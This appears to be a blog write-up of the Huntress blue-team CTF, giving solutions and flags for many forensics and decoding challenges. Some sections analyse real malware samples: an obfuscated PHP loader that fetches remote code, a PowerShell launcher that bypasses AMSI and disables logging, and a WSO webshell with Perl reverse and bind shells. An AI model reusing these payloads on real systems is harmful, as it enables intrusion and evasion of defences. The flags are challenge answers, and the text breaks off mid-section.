[{"categories":["CTF - BlueTeam"],"content":"Huntress CTF was a one month blue team CTF.","date":"2023-10-21","objectID":"/posts/ctf/huntress/","tags":["blueteam","redteam","ctf","development"],"title":"CTF: Huntress CTF","uri":"/posts/ctf/huntress/"},{"categories":["CTF - BlueTeam"],"content":"Huntress Writeup Each challenges successfully solved will be explained here. The solution will not only be put in writing but also the way of thinking and failed tries will be described. Unfortunately, took too long to write it (didn’t took note …) so wasn’t able to re-do all the challenges before the server shutdown. ","date":"2023-10-21","objectID":"/posts/ctf/huntress/:0:0","tags":["blueteam","redteam","ctf","development"],"title":"CTF: Huntress CTF","uri":"/posts/ctf/huntress/"},{"categories":["CTF - BlueTeam"],"content":"Read The Rules This challenge is pretty straight forward. Read the rules using the view-source utility and you will find a commented html line with the flag. flag: flag{90bc54705794a62015369fd8e86e557b} ","date":"2023-10-21","objectID":"/posts/ctf/huntress/:1:0","tags":["blueteam","redteam","ctf","development"],"title":"CTF: Huntress CTF","uri":"/posts/ctf/huntress/"},{"categories":["CTF - BlueTeam"],"content":"Notepad To solve this challenge we will first check what’s file we have using the file command. We can see that the file contains UTF-8 Unicode text: We can just go ahead an cat the file, here goes the flag. flag: flag{2dd41e3da37ef1238954d8e7f3217cd8} ","date":"2023-10-21","objectID":"/posts/ctf/huntress/:2:0","tags":["blueteam","redteam","ctf","development"],"title":"CTF: Huntress CTF","uri":"/posts/ctf/huntress/"},{"categories":["CTF - BlueTeam"],"content":"Technical Support You just need to join the discord and you will have a flag in the technical support channel. flag: flag{a98373a74abb8c5ebb8f5192e034a91c} ","date":"2023-10-21","objectID":"/posts/ctf/huntress/:3:0","tags":["blueteam","redteam","ctf","development"],"title":"CTF: Huntress CTF","uri":"/posts/ctf/huntress/"},{"categories":["CTF - BlueTeam"],"content":"String Cheese We will start by checking if the file is a real png or not. Do to so we will be using the “file” command. When opening the file, we are not able to see anything appear from the png. From there we will be looking at the strings inside the png flag to check for hidden data: Got it. Flags was hidden in the PNG file data. flag: flag{f4d9f0f70bf353f2ca23d81dcf7c9099} ","date":"2023-10-21","objectID":"/posts/ctf/huntress/:4:0","tags":["blueteam","redteam","ctf","development"],"title":"CTF: Huntress CTF","uri":"/posts/ctf/huntress/"},{"categories":["CTF - BlueTeam"],"content":"Query Code As always we will start by checking what’s the file data are using “file” command. So the file looks to be a PNG file. We will move ahead by renaming the query_code to query_code.png and open it. We are presented with a QRCode. Moving through and checking the QRCode value, a text that appears to be the flag was the content of it: flag: flag{3434cf5dc6a865657ea1ec1cb675ce3b} ","date":"2023-10-21","objectID":"/posts/ctf/huntress/:5:0","tags":["blueteam","redteam","ctf","development"],"title":"CTF: Huntress CTF","uri":"/posts/ctf/huntress/"},{"categories":["CTF - BlueTeam"],"content":"Zerion We are presented with a PHP file that seems to be obfuscated. This file contains two parts. The first part is a PHP code and the second part is a long string that looks like a reverse base64. \u003c?php $L66Rgr=explode(base64_decode(\"Pz4=\"),file_get_contents(__FILE__)); $L6CRgr=array(base64_decode(\"L3gvaQ==\"),base64_decode(\"eA==\"),base64_decode(strrev(str_rot13($L66Rgr[1]))));$L7CRgr = \"d6d666e70e43a3aeaec1be01341d9f9d\";preg_replace($L6CRgr[0],serialize(eval($L6CRgr[2])),$L6CRgr[1]);exit();?\u003e==Dstfmoz5JnxNvolIUqyWUV7xFXa0lWtbQVaD1Wt8QVcNQZlNQrjNvWtZKolITpxtPXtbQVcNlW4qPV6NlW0qPV/NFXjNwZjtUZtLPVm1zpyOUWbtPV/NFXkNQZjtUZtLPVm1zpyOUWbtPV94PViMzocEPV7xlWgpPV6NlW3qPV/NFXlNQZjtUZtLPVm1zpyOUWbtPV94PViMzocEPV7xlWgpPV6NlWlqPV/NFX0NQZjtUZtLPVm1zpyOUWbtPV94PViMzocEPV7xFXa0lWtbQVaZ1Wt8QVcNQZ0NQrjNvWtZKolITpxtPXtbQVcNlW4qPV6NlWmqPV/NFXjNQAjtUZtLPVm1zpyOUWbtPV/NFX4NQZjtUZtLPVm1zpyOUWbtPV94PViMzocEPV7xlWgpPV6NlW3qPV/NFXjRQZjtUZtLPVm1zpyOUWbtPV94PViMzocEPV7xlWgpPV6NlWlqPV/ [...] Reformating this code it produce a decoding routine. \u003c?php $payload=explode(base64_decode(\"Pz4=\"),file_get_contents(__FILE__)); #get the variable by reading the file content and splitting on \"?\u003e\" $payload=array(base64_decode(\"L3gvaQ==\"),base64_decode(\"eA==\"),base64_decode(strrev(str_rot13($payload[1])))); #payload[1] is corresponding to the long string and his decode using the routine : ROT13 -\u003e Reverse -\u003e B64 decode $L7CRgr = \"d6d666e70e43a3aeaec1be01341d9f9d\"; preg_replace($payload[0],serialize(eval($payload[2])),$payload[1]); #replacing the php code after execution exit(); ?\u003e By using Cyberchef we are able to replicate the routine and get the executed payload. function GC($a) { $url = sprintf('%s?api=%s\u0026ac=%s\u0026path=%s\u0026t=%s', $a, $_REQUEST['api'], $_REQUEST['ac'], $_REQUEST['path'], $_REQUEST['t']); $code = @file_get_contents($url); if ($code == false) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_USERAGENT, 'll'); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_TIMEOUT, 100); curl_setopt($ch, CURLOPT_FRESH_CONNECT, TRUE); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); $code = curl_exec($ch); curl_close($ch); }return $code;} if (isset($_REQUEST['ac']) \u0026\u0026 isset($_REQUEST['path']) \u0026\u0026 isset($_REQUEST['api']) \u0026\u0026 isset($_REQUEST['t'])) { $code = GC('https://c.-wic5-.com/'); if(!$code){$code = GC('https://c.-oiv3-.com/?flag=flag{af10370d485952897d5183aa09e19883} ');}$need = [...] And we can identify the flag. flag: flag{af10370d485952897d5183aa09e19883} ","date":"2023-10-21","objectID":"/posts/ctf/huntress/:6:0","tags":["blueteam","redteam","ctf","development"],"title":"CTF: Huntress CTF","uri":"/posts/ctf/huntress/"},{"categories":["CTF - BlueTeam"],"content":"Book By Its Cover We are presented with a file that have a .rar extention. As always verify the file type with the file command. It appears to be a PNG and not a RAR so we will go ahead and rename it. Opening it we can see that it’s in fact a PNG and more than that the flag ! flag: flag{f8d32a346745a6c4bf4e9504ba5308f0} ","date":"2023-10-21","objectID":"/posts/ctf/huntress/:7:0","tags":["blueteam","redteam","ctf","development"],"title":"CTF: Huntress CTF","uri":"/posts/ctf/huntress/"},{"categories":["CTF - BlueTeam"],"content":"HumanTwo We are presented with a zip file that contains lot of webshells. In the chall introduction we can see that we need to spot the difference in the different files. So starting from there we will unzip ressources and perform a diff on it. To perform the diff we will use the following command : for i in ./*; do diff \"$i\" 0019de2359fe758b0c7cd04c361dfbb798a1d897f3e67de3756645b423dbfe3f; done We spot a line that looks different that the others : Analysing the found line (if (!String.Equals(pass, \"666c6167-7b36-6365-3666-366131356464\"+\"64623065-6262-3333-3262-666166326230\"+\"62383564-317d-0000-0000-000000000000\"))) we can spot a guid looking like an Hex string. Moving from there, you can use cyberchef to decode it as shown below: And here is the flag ! flag: flag{6ce6f6a15dddb0ebb332bfaf2b0b85d1} ","date":"2023-10-21","objectID":"/posts/ctf/huntress/:8:0","tags":["blueteam","redteam","ctf","development"],"title":"CTF: Huntress CTF","uri":"/posts/ctf/huntress/"},{"categories":["CTF - BlueTeam"],"content":"Hot Off The Press The given file does have an extension but the challenge introduction specify an archive password. So we will go ahead and identify the file type and rename it accordingly. Using WinUHA we can extract the content of it and find a powershell script. The powershell file contains obfuscated command lines that we will need to decode. Original: C:\\Windows\\SysWOW64\\cmd.exe /c powershell.exe -nop -w hidden -noni -c if([IntPtr]::Size -eq 4){$b=$env:windir+'\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe'}else{$b='powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c $x_wa3=((''Sc''+''{2}i''+''pt{1}loc{0}Logg''+''in''+''g'')-f''k'',''B'',''r'');If($PSVersionTable.PSVersion.Major -ge 3){ $sw=((''E''+''nable{3}''+''c{''+''1}''+''ip{0}Bloc{2}Logging''+'''')-f''t'',''r'',''k'',''S''); $p8=[Collections.Generic.Dictionary[string,System.Object]]::new(); $gG0=((''Ena''+''ble{2}c{5}i{3}t{''+''4}loc''+''{0}{1}''+''nv''+''o''+''cationLoggi''+''ng'')-f''k'',''I'',''S'',''p'',''B'',''r''); $jXZ4D=[Ref].Assembly.GetType(((''{0}y''+''s''+''tem.{1}a''+''n''+''a{4}ement.A{5}t''+''omati''+''on.{2''+''}ti{3}s'')-f''S'',''M'',''U'',''l'',''g'',''u'')); $plhF=[Ref].Assembly.GetType(((''{''+''6}{''+''5}stem.''+''{''+''3''+''}{9}''+''n{9}{''+''2}ement''+''.{''+''8}{''+''4}t{''+''7''+''}''+''m{9}ti{7}n''+''.''+''{8''+''}''+''m''+''si{0''+''}ti{''+''1}s'')-f''U'',''l'',''g'',''M'',''u'',''y'',''S'',''o'',''A'',''a'')); if ($plhF) { $plhF.GetField(((''''+''a{''+''0}''+''si{4}''+''nit{''+''1}''+''ai''+''l{2}{''+''3}'')-f''m'',''F'',''e'',''d'',''I''),''NonPublic,Static'').SetValue($null,$true); }; $lCj=$jXZ4D.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($lCj) { $a938=$lCj.GetValue($null); If($a938[$x_wa3]){ $a938[$x_wa3][$sw]=0; $a938[$x_wa3][$gG0]=0; } $p8.Add($gG0,0); $p8.Add($sw,0); $a938[''HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\''+$x_wa3]=$p8; } Else { [Ref].Assembly.GetType(((''S{2}{3}''+''t''+''em''+''.Mana''+''ge''+''ment.{''+''5}{4}to''+''mation.Scr''+''ipt{1}loc{0}'')-f''k'',''B'',''y'',''s'',''u'',''A'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};\u0026([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4sI''+''AIeJ''+''G2UC/+1X''+''bU/jOBD+3l9hrS''+''IlkU{0}''+''VFvb{1}IiFdWqD''+''bPRJKS8vR''+''brUKy''+''TR168TFcQplb//7''+''jfNSygJ73{1}lI94F''+''IVvwyMx4/M''+''7YfT9PYl5TH''+''hH7sku8VUnxd''+''T3gRMTT/ku''+''/fWUSjS3Mzp'' [...] We will only decrypt the interesting part with is the Base64 string passed to the GzipStream function. Using CyberChef we are able to reproduce the decryption routine : We are presented with a new code snippet containing a new Base 64 to decode: [...] [Byte[]]$nLQ2k = [System.Convert]::FromBase64String(\"ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI","date":"2023-10-21","objectID":"/posts/ctf/huntress/:9:0","tags":["blueteam","redteam","ctf","development"],"title":"CTF: Huntress CTF","uri":"/posts/ctf/huntress/"},{"categories":["CTF - BlueTeam"],"content":"BaseFFFF+1 This chall was one of the most rabitholish of this CTF. The solution is pretty simple but overthinking these chall is also pretty easy. We are presented with an encoded string : 鹎驣𔔠𓁯噫谠啥鹭鵧啴陨驶𒄠陬驹啤鹷鵴𓈠𒁯ꔠ𐙡啹院驳啳驨驲挮售𖠰筆筆鸠啳樶栵愵欠樵樳昫鸠啳樶栵嘶谠ꍥ啬𐙡𔕹𖥡唬驨驲鸠啳𒁹𓁵鬠陬潧㸍㸍ꍦ鱡汻欱靡驣洸鬰渰汢饣汣根騸饤杦样椶𠌸. Everything has been tried, custom base creation, changing known base decoding alphabet, etc … But the solution is just to read the title and understand it. BaseFFFF+1 is basically FFFF in hex which is equal to 65535 +1, that’s equal to 65536. So we get Base65536 which is apparently a known base. Decoding it with a random online website we get the flag! flag: flag{716abce880f09b7cdc7938eddf273648} ","date":"2023-10-21","objectID":"/posts/ctf/huntress/:10:0","tags":["blueteam","redteam","ctf","development"],"title":"CTF: Huntress CTF","uri":"/posts/ctf/huntress/"},{"categories":["CTF - BlueTeam"],"content":"Traffic This challenge wasn’t the solve the inteded way but it is what it is. We know that we are looking for a “sketchy site”. So we will go ahead and extract all the data. Then the cheat happen, just strings file and grep for sketchy. So we’ve got an intersting domain sketchysite.github.io, which by visiting it give the flag. flag: flag{8626fe7dcd8d412a80d0b3f0e36afd4a} ","date":"2023-10-21","objectID":"/posts/ctf/huntress/:11:0","tags":["blueteam","redteam","ctf","development"],"title":"CTF: Huntress CTF","uri":"/posts/ctf/huntress/"},{"categories":["CTF - BlueTeam"],"content":"CaesarMirror The chall introduction gives us the hint to look for ROT13. We have as material the following text: Bu obl! Jbj, guvf jnezhc punyyratr fher bf V !erugrtbg ghc bg ahs sb gby n fnj qrsvavgryl nofbyhgryl nyjnlf ybir gelvat ftavug rivgnibaav qan jra ch xavug bg gb qb jvgu gur irel onfvp, pbzzba naq sb genc gfevs ruG !frhdvauprg SGP pvffnyp lbhe synt vf synt{whyvhf_ naq gung vf n tavuglerir gba fv gv gho gengf gnret gung lbh jvyy arrq gb fbyir guvf punyyratr. qan rqvu bg tavleg rxvy g'abq V frcnengr rnpu cneg bs gur synt. Gur frpbaq bq hbl gho _n_av fv tnys rug sb genc arrq whfg n yvggyr ovg zber. Jung rknpgyl rxnz qan leg bg reru rqhypav rj qyhbuf guvf svyyre grkg ybbx zber ratntvat naq ?fravyjra qqn rj qyhbuF ?ryvujugebj Fubhyq jr nqq fcnprf naq gel naq znxr vg uthbar fv fravy lanz jbU ?ynpvegrzzlf gb znxr guvf svyyre grkg ybbx oryvrinoyr? N n avugvj ferggry sb renhdf qvybf fvzcyr, zbabfcnpr-sbag grkg svyr ybbxf tbbq rug gn gfbzyn rj reN .rz bg uthbar raq? Vg ybbxf yvxr vg! V ubcr vg vf tbbq. }abvgprysre fv tnys ehbl sb genc qevug ruG naq ng guvf cbvag lbh fubhyq unir rirelguvat ebs tnys fvug gvzohf bg qrra hbl gnug cbvagf. Gur ortvaavat vf znexrq jvgu gur ,rpneo lyehp tavarcb rug qan kvsrec tnys naq vg vapyhqrf Ratyvfu jbeqf frcnengrq ol lyehp tavfbyp n av qar bg ,frebpferqah oenpr. Jbj! Abj GUNG vf n PGS! Jub xarj jr fvug bg erucvp enfrnp rug xyvz qyhbp rkgrag?? Fbzrbar trg gung Whyvhf !ynqrz n lht enfrnP Doing a ROT 13 translation gives us the decrypted text for the left part: Oh boy! Wow, this warmup challenge sure os I !rehtegot tup ot nuf fo tol a saw definitely absolutely always love trying sgniht evitavonni dna wen pu kniht ot to do with the very basic, common and fo trap tsrif ehT !seuqinhcet FTC cissalc your flag is flag{julius_ and that is a gnihtyreve ton si ti tub trats taerg that you will need to solve this challenge. dna edih ot gniyrt ekil t'nod I separate each part of the flag. The second od uoy tub _a_ni si galf eht fo trap need just a little bit more. What exactly ekam dna yrt ot ereh edulcni ew dluohs this filler text look more engaging and ?senilwen dda ew dluohS ?elihwhtrow Should we add spaces and try and make it hguone si senil ynam woH ?lacirtemmys to make this filler text look believable? A a nihtiw srettel fo erauqs dilos simple, monospace-font text file looks good eht ta tsomla ew erA .em ot hguone end? It looks like it! I hope it is good. }noitcelfer si galf ruoy fo trap driht ehT and at this point you should have everything rof galf siht timbus ot deen uoy taht points. The beginning is marked with the ,ecarb ylruc gninepo eht dna xiferp galf and it includes English words separated by ylruc gnisolc a ni dne ot ,serocsrednu brace. Wow! Now THAT is a CTF! Who knew we siht ot rehpic raseac eht klim dluoc extent?? Someone get that Julius !ladem a yug raseaC Obvserving the resulting right part we can identify that the sentence are reversed and in the wrong order. Re-formating it give us the following: Caesar guy a medal! suiluJ taht teg enoemoS ??tnetxe could milk the caesar cipher to this ew wenk ohW !FTC a si TAHT woN !woW .ecarb underscores, to end in a closing curly yb detarapes sdrow hsilgnE sedulcni ti dna flag prefix and the opening curly brace, eht htiw dekram si gninnigeb ehT .stniop that you need to submit this flag for gnihtyreve evah dluohs uoy tniop siht ta dna The third part of your flag is reflection} .doog si ti epoh I !ti ekil skool tI ?dne enough to me. Are we almost at the doog skool elif txet tnof-ecapsonom ,elpmis solid square of letters within a A ?elbaveileb kool txet rellif siht ekam ot symmetrical? How many lines is enough ti ekam dna yrt dna secaps dda ew dluohS worthwhile? Should we add newlines? dna gnigagne erom kool txet rellif siht should we include here to try and make yltcaxe tahW .erom tib elttil a tsuj deen part of the flag is in_a_ but you do dnoces ehT .galf eht fo trap hcae etarapes I don't like trying to hide and .egnellahc siht evlos ot deen lliw uoy tah","date":"2023-10-21","objectID":"/posts/ctf/huntress/:12:0","tags":["blueteam","redteam","ctf","development"],"title":"CTF: Huntress CTF","uri":"/posts/ctf/huntress/"},{"categories":["CTF - BlueTeam"],"content":"I Wont Let You Down For this challenge we are provided with an URL : http://155.138.162.158. Visiting this website we get a video running a quite taunting popular song. When this chall was released, some issue where seen on the instance, and a lot of incoherence has been seen, so we will only consider the things done in the stable part of the chall. Doing an nmap, we can find some open ports (nmap is allowed for this chall only). Nmap scan report for 155.138.162.158.vultrusercontent.com (155.138.162.158) Host is up (0.14s latency). Not shown: 997 filtered ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 8888/tcp open sun-answerbook Nmap done: 1 IP address (1 host up) scanned in 15.86 seconds The SSH might be for Huntress staff to administrate the server, the port 80 is for the web service but the 8888 is quite surprising. Looking into it with telnet, got some nice lyrics and the flag ! flag: flag{93671c2c38ee872508770361ace37b02} ","date":"2023-10-21","objectID":"/posts/ctf/huntress/:13:0","tags":["blueteam","redteam","ctf","development"],"title":"CTF: Huntress CTF","uri":"/posts/ctf/huntress/"},{"categories":["CTF - BlueTeam"],"content":"PHP Stagger The challenge is to analyze a php file containing a base64 and a piece of code. The piece of code looks like that : \u003c?php function deGRi($wyB6B, $w3Q12 = '') { $zZ096 = $wyB6B; $pCLb8 = ''; for ($fMp3G = 0; $fMp3G \u003c strlen($zZ096);) { for ($oxWol = 0; $oxWol \u003c strlen($w3Q12) \u0026\u0026 $fMp3G \u003c strlen($zZ096); $oxWol++, $fMp3G++) { $pCLb8 .= $zZ096[$fMp3G] ^ $w3Q12[$oxWol]; } } return $pCLb8; } /*iNsGNGYwlzdJjfaQJIGRtTokpZOTeLzrQnnBdsvXYlQCeCPPBElJTcuHmhkJjFXmRHApOYlqePWotTXHMuiuNfUYCjZsItPbmUiXSxvEEovUceztrezYbaOileiVBabK*/ $lBuAnNeu5282 = \")o4la2cih1kp97rmt*x5dw38b(sfy6;envguz_jq/.0\"; $gbaylYLd6204 = \"LmQ9AT8aND16c2AcMh0lCS9BDFtTATklDzAoARAJCkl+NwQuLTE[...]\" $fsPwhnfn8423 = \"\"; $oZjuNUpA325 = \"\"; foreach([24,4,26,31,29,2,37,20,31,6,1,20,31] as $k){ $fsPwhnfn8423 .= $lBuAnNeu5282[$k]; } foreach([26,16,14,14,31,33] as $k){ $oZjuNUpA325 .= $lBuAnNeu5282[$k]; } /*aajypPZLxFoueiuYpHkwIQbmoSLrNBGmiaDTgcWLKRANAfJxGeoOIzIjLBHHsVEHKTrhqhmFqWgapWrPsuMYcbIZBcXQrjWWEGzoUgWsqUfgyHtbwEDdQxcJKxGTJqIe*/ $k = $oZjuNUpA325('n'.''.''.'o'.''.''.'i'.''.'t'.''.'c'.''.'n'.''.'u'.'f'.''.''.''.''.'_'.''.''.''.'e'.''.'t'.''.'a'.''.'e'.''.''.''.''.'r'.''.''.''.''.'c'); $c = $k(\"/*XAjqgQvv4067*/\", $fsPwhnfn8423( deGRi($fsPwhnfn8423($gbaylYLd6204), \"tVEwfwrN302\"))); $c(); /*TnaqRZZZJMyfalOgUHObXMPnnMIQvrNgBNUkiLwzwxlYWIDfMEsSyVVKkUfFBllcCgiYSrnTCcqLlZMXXuqDsYwbAVUpaZeRXtQGWQwhcAQrUknJCeHiFTpljQdRSGpz*/ Putting the code in order looks like: \u003c?php function xorFunction($string, $key='') { $text = $string; $outText = ''; for($i=0; $i\u003cstrlen($text); ) { for($j=0; ($j\u003cstrlen($key) \u0026\u0026 $i\u003cstrlen($text)); $j++,$i++) { $outText .= $text{$i} ^ $key{$j}; } } return $outText; } $encodedString = \"LmQ9AT8aND16c2AcMh0lCS9BDFtTATklDzAoARAJCkl+NwQuLTE[...]\" $c = create_function(\"/*XAjqgQvv4067*/\", base64_decode(xorFunction(base64_decode($encodedString), \"tVEwfwrN302\"))); $c(); Creating this routine in CyberChef gives us the code of an php served web page. Only the last part is interesting: [...] function actionNetwork() { wsoHeader(); $back_connect_p=\"IyEvdXNyL2Jpbi9wZXJsCnVzZSBTb2NrZXQ7CiRpYWRkcj1pbmV0X2F0b24oJEFSR1ZbMF0pIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsKJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsKJHByb3RvPWdldHByb3RvYnluYW1lKCd0Y3AnKTsKc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sICRwcm90bykgfHwgZGllKCJFcnJvcjogJCFcbiIpOwpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7Cm9wZW4oU1RESU4sICI+JlNPQ0tFVCIpOwpvcGVuKFNURE9VVCwgIj4mU09DS0VUIik7Cm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsKbXkgJHN0ciA9IDw8RU5EOwpiZWdpbiA2NDQgdXVlbmNvZGUudXUKRjlGUUE5V0xZOEM1Qy0jLFEsVjBRLENEVS4jLFUtJilFLUMoWC0mOUM5IzhTOSYwUi1HVGAKYAplbmQKRU5ECnN5c3RlbSgnL2Jpbi9zaCAtaSAtYyAiZWNobyAke3N0cmluZ307IGJhc2giJyk7CmNsb3NlKFNURElOKTsKY2xvc2UoU1RET1VUKTsKY2xvc2UoU1RERVJSKQ==\"; $bind_port_p=\"IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=\"; echo \"\u003ch1\u003eNetwork tools\u003c/h1\u003e\u003cdiv class=content\u003e \u003cform name='nfp' onSubmit=\\\"g(null,null,'bpp',this.port.value);return false;\\\"\u003e [...] By decoding the base64 we get two pieces of code, the most interesting one is this one : #!/usr/bin/perl use Socket; $iaddr=inet_aton($ARGV[0]) || die(\"Error: $!\\n\"); $paddr=sockaddr_in($ARGV[1], $iaddr) || die(\"Error: $!\\n\"); $proto=getprotobyname('tcp'); socket(SOCKET, PF_INET, SOCK_STREA","date":"2023-10-21","objectID":"/posts/ctf/huntress/:14:0","tags":["blueteam","redteam","ctf","development"],"title":"CTF: Huntress CTF","uri":"/posts/ctf/huntress/"},{"categories":["CTF - BlueTeam"],"content":"Dialtone We are provided with a wav file looking like dialtones in a phone. Using dtmf we are able to extract the corresponding string. This looks like a long that we need to convert to strings. We can use the following code snippet : from Crypto.Util.number import long_to_bytes data = 13040004482820197714705083053746380382743933853520408575731743622366387462228661894777288573 bytes = long_to_bytes(data) print(bytes) That return the flag ! flag: flag{6c733ef09bc4f2a4313ff63087e25d67} ","date":"2023-10-21","objectID":"/posts/ctf/huntress/:15:0","tags":["blueteam","redteam","ctf","development"],"title":"CTF: Huntress CTF","uri":"/posts/ctf/huntress/"},{"categories":["CTF - BlueTeam"],"content":"Layered Security Using the file command we are seing that the file is in fact a GIMP file. Opening it in GIMP give us multiple images and on one of them display the flag. flag: flag{9a64bc4a390cb0ce31452820ee562c3f} ","date":"2023-10-21","objectID":"/posts/ctf/huntress/:16:0","tags":["blueteam","redteam","ctf","development"],"title":"CTF: Huntress CTF","uri":"/posts/ctf/huntress/"},{"categories":["CTF - BlueTeam"],"content":"Backdoored Splunk For this challenge we had two materials provided: a website and a zip file. Inside the zip we can see the code of a splunk agent for windows machine. When navigating to the website, the following message was deplayed : Giving the fact that it requires an Authorization header and that we have sources maybe we can find the token inside it. Using grep on the files, we find the appropriate token. Using this token with curl we can just access the website and get a base64 string. This base64 is in fact the flag ! flag: flag{60bb3bfaf703e0fa36730ab70e115bd7} ","date":"2023-10-21","objectID":"/posts/ctf/huntress/:17:0","tags":["blueteam","redteam","ctf","development"],"title":"CTF: Huntress CTF","uri":"/posts/ctf/huntress/"},{"categories":["CTF - BlueTeam"],"content":"Dumpster Fire We are presented with a linux file system. Dumping the passwd file we can spot a user named Challenge. Navigating to it we can identify a mozilla repertory and nothing else interesing. From there we can identify the profile and find the login.json file with encrypted credentials. Using a firefox decoder we can extract the corresponding password and have the flag ! flag: flag{35446041dc161cf5c9c325a3d28af3e3} ","date":"2023-10-21","objectID":"/posts/ctf/huntress/:18:0","tags":["blueteam","redteam","ctf","development"],"title":"CTF: Huntress CTF","uri":"/posts/ctf/huntress/"},{"categories":["CTF - BlueTeam"],"content":"Comprezz This chall is really straightforward. You just need to add the zip extension to the given file and extract the content to read the flag ! flag: flag{196a71490b7b55c42bf443274f9ff42b} ","date":"2023-10-21","objectID":"/posts/ctf/huntress/:19:0","tags":["blueteam","redteam","ctf","development"],"title":"CTF: Huntress CTF","uri":"/posts/ctf/huntress/"},{"categories":["CTF - BlueTeam"],"content":"Where am I? This chall is not a real OSINT challenge so don’t go down that way. Analyzing the file properties we can find some base64 in the Title. Decoding this base64 we get a flag ! flag: flag{b11a3f0ef4bc170ba9409c077355bba2) ","date":"2023-10-21","objectID":"/posts/ctf/huntress/:20:0","tags":["blueteam","redteam","ctf","development"],"title":"CTF: Huntress CTF","uri":"/posts/ctf/huntress/"},{"categories":["CTF - BlueTeam"],"content":"Chicken Wings For this chall we have a string composed by emojies. The string is the following : ♐●♋♑❀♏📁🖮🖲📂♍♏⌛🖰♐🖮📂🖰📂🖰🖰♍📁🗏🖮🖰♌📂♍📁♋🗏♌♎♍🖲♏❝ Typing google ’emoji to text decode’, we were able to find the following website. Using this website, the decoding goes good and got the flag ! flag: flag{e0791ce68f718188c0378b1c0a3bdc9e} ","date":"2023-10-21","objectID":"/posts/ctf/huntress/:21:0","tags":["blueteam","redteam","ctf","development"],"title":"CTF: Huntress CTF","uri":"/posts/ctf/huntress/"},{"categories":["CTF - BlueTeam"],"content":"Wimble This challenge start with a ZIP file. Extracting the content we find a Windows Imaging file. Extracting it got the PF files that we need to analyze as we will do in forensic thing (after all that’s a blue team oriented CTF). Using PECmd we are able to analyze those PF files. Greping to the output searching for flag we are able to get it. flag: flag{97f33c9783c21df85d79d613b0b258bd} ","date":"2023-10-21","objectID":"/posts/ctf/huntress/:22:0","tags":["blueteam","redteam","ctf","development"],"title":"CTF: Huntress CTF","uri":"/posts/ctf/huntress/"},{"categories":["CTF - BlueTeam"],"content":"F12 This chall is the first chall with no resource and only a distant webserver. We have a web page with a button calling the function ctf(). This function open a new window with a specific path : function 